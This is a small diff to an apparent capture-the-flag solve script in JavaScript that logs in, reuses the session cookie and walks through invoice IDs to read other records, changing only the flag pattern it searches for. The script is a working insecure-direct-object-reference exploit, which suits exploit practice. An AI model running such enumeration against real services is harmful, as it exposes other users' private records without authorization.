@@ -9,7 +9,7 @@ const login = await fetch(new URL('login', base), {
 const cookie = login.headers.get('set-cookie').split(';')[0];
 for (let id = 1042; id >= 1000; id -= 1) {
   const body = await (await fetch(new URL(`invoice?id=${id}`, base), { headers: { cookie } })).text();
-  const flag = /FLAG\{[^}]+\}/u.exec(body)?.[0];
+  const flag = /CTF\{[^}]+\}/u.exec(body)?.[0];
   if (flag) {
     process.stdout.write(flag);
     process.exit(0);
